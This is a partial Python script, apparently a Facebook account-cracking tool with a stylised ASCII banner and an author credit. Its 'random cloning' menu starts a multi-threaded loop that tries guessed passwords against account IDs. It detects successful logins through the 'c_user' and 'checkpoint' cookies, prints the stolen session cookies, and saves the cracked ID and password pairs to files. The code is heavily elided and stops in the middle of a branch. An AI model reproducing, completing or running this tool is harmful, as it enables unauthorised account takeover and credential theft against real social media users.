...
░██▄▄▄▄██ ▒██░   ░██▄▄▄▄██ ░▓█ ░██ ░██░
 ...
 ▒▒   ▓▒█░░ ▒░▓  ░▒▒   ▓▒█░ ▒ ░░▒░▒░▓  
  ...
  ░   ▒     ░ ░    ░   ▒    ░  ░░ ░ ▒ ░
    ...
    V.1
\033[1;30m───────────────────────────────────────────
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    : Fazla Alahi            
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  : Fazla Alahi           
...
def Main():
        os.system("clear")
        os.system('xdg-open ')
        os.system('espeak -a 300 "WELCOME TO  Alahi RANDOM TOOLS"')
        print(logo)
        print(" \x1b[0m[1] RANDOM CLONING \x1b[1;95m (BANGLADESH)")
        print(" \x1b[1;94m[0] Exit")
         Alahisexy =input("\n \x1b[1;96m[?] Choose : ")
        if  Alahisexy in ["1","01"]:
            fuck()
        if  Alahisexy in [" 0", "00"]:
            exit()
        else:
            exit()
...
def fuck():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for love in user:
            ...
            yaari.submit( Alahisexy2,uid,pwx,tl)
    print('•────────────────•°•❀•°•────────────────•')
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in  Alahi/OK.txt')
    print(' [+] CP Ids saved in  Alahi/CP.txt')
    print('•────────────────•°•❀•°•────────────────•')
def  Alahisexy2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[ Alahi]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[ Alahi-OK🔥🖤🍎] {uid}|{ps} \nCookie[🍒] : {coki}")
                open('/sdcard/ Alahi/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[ Alahi-CP☠️] {uid}|{ps}")
                open('/sdcard/ Alahi-OK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
